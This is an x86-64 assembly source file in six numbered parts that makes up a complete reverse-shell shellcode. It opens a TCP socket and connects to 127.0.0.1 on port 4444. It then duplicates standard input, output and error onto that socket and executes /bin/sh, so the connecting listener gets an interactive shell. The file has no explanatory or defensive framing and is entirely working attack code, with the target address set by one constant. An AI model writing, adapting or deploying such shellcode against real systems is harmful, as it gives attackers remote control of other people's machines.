global _start

section .text

_start:

	; part 0
	xor rax, rax
	xor rbx, rbx
	xor rcx, rcx
	xor rdx, rdx
	xor rdi, rdi
	xor rsi, rsi
	
	; part 1
	mov al, 41
	mov dil, 2
	mov sil, 1
	mov dl, 6
	syscall
	mov r8, rax

	; part 2
	sub rsp, 8
	mov BYTE[rsp],0x2
	mov WORD[rsp+0x2],0x5c11
	mov DWORD[rsp+0x4], 0x0101017f ; 127.0.0.1
	mov rsi, rsp
	mov dl, 16
	push r8
	pop rdi
	mov al, 42
	syscall

	; part 3
	mov al, 33
	push r8
	pop rdi
	xor rsi, rsi
	syscall

	; part 4
	mov al, 33
	push r8
	pop rdi
	mov sil, 1
	syscall

	; part 5
	mov al, 33
	push r8
	pop rdi
	mov sil, 2
	syscall

	; part 6
	xor rsi, rsi
	push rsi
	mov rdi, 0x68732f2f6e69622f
	push rdi
	push rsp
	pop rdi
	mov al, 59
	cdq
	syscall
